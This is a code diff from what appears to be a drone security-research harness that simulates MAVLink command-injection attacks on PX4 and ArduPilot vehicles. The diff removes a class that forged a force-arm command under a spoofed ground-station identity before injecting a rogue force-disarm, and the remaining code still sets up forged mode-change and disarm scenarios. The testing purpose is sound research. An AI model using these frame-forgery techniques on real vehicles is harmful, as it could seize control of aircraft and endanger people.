@@ -325,58 +325,6 @@ class BenignPilotControlHook:
         return [ctx.raw]
 
 
-class RogueForceDisarmAttack(CommandInjectionAttack):
-    """Arms the vehicle on the ground (if disarmed) before injecting rogue force-disarm (#24)."""
-
-    def __init__(self, *args: Any, auto_arm_if_disarmed: bool = False, **kwargs: Any) -> None:
-        super().__init__(*args, **kwargs)
-        self.auto_arm_if_disarmed = bool(auto_arm_if_disarmed)
-        self.vehicle_armed_observed = False
-        self.pre_arm_sent = False
-        self._hb_decoder = mav2.MAVLink(None)
-
-    def __call__(self, ctx: FrameContext) -> list[bytes]:
-        if ctx.direction == "down" and ctx.msgid == HEARTBEAT_ID and not ctx.signed:
-            try:
-                m = self._hb_decoder.decode(bytearray(ctx.raw))
-                if m.get_type() == "HEARTBEAT" and getattr(m, "autopilot", None) in (
-                    _MAV_AUTOPILOT_PX4,
-                    mav2.MAV_AUTOPILOT_ARDUPILOTMEGA,
-                ):
-                    self.vehicle_armed_observed = bool(int(getattr(m, "base_mode", 0)) & 0x80)
-            except Exception:
-                pass
-        out = super().__call__(ctx)
-        if (
-            ctx.direction == "up"
-            and self.auto_arm_if_disarmed
-            and not self.vehicle_armed_observed
-            and not self.pre_arm_sent
-            and self._target_sysid is not None
-            and self._target_compid is not None
-        ):
-            self.pre_arm_sent = True
-            enc = mav2.MAVLink(None, srcSystem=255, srcComponent=190)
-            enc.seq = (ctx.seq + 1) & 0xFF
-            arm_frame = bytes(
-                enc.command_long_encode(
-                    self._target_sysid,
-                    self._target_compid,
-                    400,
-                    0,
-                    1.0,
-                    21196.0,
-                    0.0,
-                    0.0,
-                    0.0,
-                    0.0,
-                    0.0,
-                ).pack(enc)
-            )
-            return [out[0], arm_frame, *out[1:]]
-        return out
-
-
 def build_restricted_visibility_hook(
     scenario: str,
     *,
@@ -386,18 +334,17 @@ def build_restricted_visibility_hook(
     target_sysid: int | None = None,
     target_compid: int | None = None,
     frame_log: FrameLogWriter | None = None,
-    auto_arm_if_disarmed: bool = False,
 ) -> Any:
     """Build one of the four restricted-visibility command scenarios (#24):
 
-    - ``rogue_force_disarm``: rogue sysid 66 injects force-disarm (armed on ground)
+    - ``rogue_force_disarm``: rogue sysid 66 injects force-disarm (never emits arm commands)
     - ``gcs_forgery_own_counter``: sysid 255/190 mode-change forgery using own counter
     - ``gcs_forgery_track_identity``: sysid 255/190 mode-change forgery tracking real seq
     - ``benign_pilot_control``: benign pass-through control baseline (0 injections)
     """
     params = draw_command_injection_params(seed, trial_index=trial_index)
     if scenario == "rogue_force_disarm":
-        return RogueForceDisarmAttack(
+        return CommandInjectionAttack(
             params,
             target_sysid=target_sysid,
             target_compid=target_compid,
@@ -408,7 +355,6 @@ def build_restricted_visibility_hook(
             warmup_s=warmup_s,
             frame_log=frame_log,
             seq_policy="own_counter",
-            auto_arm_if_disarmed=auto_arm_if_disarmed,
         )
     if scenario == "gcs_forgery_own_counter":
         return CommandInjectionAttack(
